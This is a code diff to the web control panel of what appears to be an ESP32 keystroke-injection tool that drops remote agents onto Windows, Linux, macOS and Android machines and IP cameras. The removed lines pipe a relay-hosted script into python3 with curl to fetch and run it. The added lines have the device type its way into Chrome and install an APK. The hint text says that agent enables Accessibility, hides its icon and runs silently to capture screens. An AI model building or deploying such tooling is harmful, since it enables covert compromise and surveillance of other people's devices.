@@ -507,7 +507,7 @@ select:focus { outline: none; border-color: var(--green); }
         <div class="drop-item" onclick="dropAgent('windows')">🪟 Windows (PowerShell)</div>
         <div class="drop-item" onclick="dropAgent('linux')">🐧 Linux / Kali (Python3)</div>
         <div class="drop-item" onclick="dropAgent('macos')">🍎 macOS (Python3)</div>
-        <div class="drop-item" onclick="dropAgent('android')">🤖 Android (Termux open first)</div>
+        <div class="drop-item" onclick="dropAgent('android')">🤖 Android (installs APK)</div>
       </div>
     </div>
   </div>
@@ -651,7 +651,7 @@ select:focus { outline: none; border-color: var(--green); }
       <option value="windows">🪟 Windows</option>
       <option value="linux">🐧 Linux / Kali</option>
       <option value="macos">🍎 macOS</option>
-      <option value="android">🤖 Android (Termux)</option>
+      <option value="android">🤖 Android (APK agent)</option>
       <option value="camera">📷 IP Camera</option>
     </select>
 
@@ -1515,14 +1515,10 @@ async function dropAgent(os) {
   log('Dropping ' + os + ' agent…', 'info');
 
   if (os === 'android') {
-    // Open browser on Android and navigate to APK download URL
-    // Win+R → browser URL bar  OR  just type into focused browser / file manager
-    const apkUrl = RELAY_BASE + '/apk/android';
-    log('APK URL: ' + apkUrl, 'info');
-    // Send MQTT shell type 'android' — firmware types the curl command into Termux if open
-    // AND also provide the APK link for manual navigation
+    // ESP32 presses HOME → types "chrome" → opens Chrome → Ctrl+L → types APK URL → Enter
     publish({ type: 'shell', os: 'android' });
-    log('Android: open Termux or a browser and navigate to ' + apkUrl, 'warn');
+    log('Android: ESP32 opening Chrome and navigating to APK URL…', 'info');
+    log('APK: ' + RELAY_BASE + '/apk/android', 'info');
   } else {
     publish({ type: 'shell', os });
   }
@@ -1558,13 +1554,13 @@ const OS_CONFIG = {
            <strong>Requires:</strong> macOS 10.13+, Python 3, internet access.`,
   },
   android: {
-    label: 'Android (Termux)',
-    oneShot: () => termuxRun(`curl -fsSL '${RELAY_BASE}/sh/android' | python3`),
-    live:    () => termuxRun(`curl -fsSL '${RELAY_BASE}/sh/android-live' | python3 &`),
-    hint: `Open <strong>Termux</strong> on the Android device first, then tap Capture.<br>
-           ESP32 types the command into the focused Termux window and presses Enter.<br>
-           Uses <code>screencap -p</code> (built-in) or <code>termux-screenshot</code> (Termux:API addon).<br>
-           <strong>Requires:</strong> Termux installed, Python 3 (pkg install python), internet access.`,
+    label: 'Android (APK agent)',
+    oneShot: () => publish({ type: 'shell', os: 'android' }),
+    live:    () => publish({ type: 'shell', os: 'android' }),
+    hint: `ESP32 presses <strong>HOME</strong>, searches for Chrome, opens it, and navigates to the APK URL.<br>
+           Android downloads and installs the APK automatically.<br>
+           <strong>First install:</strong> Settings → Security → enable <em>Install unknown apps</em> for Chrome.<br>
+           Open the app once, enable Accessibility, then the icon disappears and the agent runs silently.`,
   },
   auto: {
     label: 'Auto-detect',
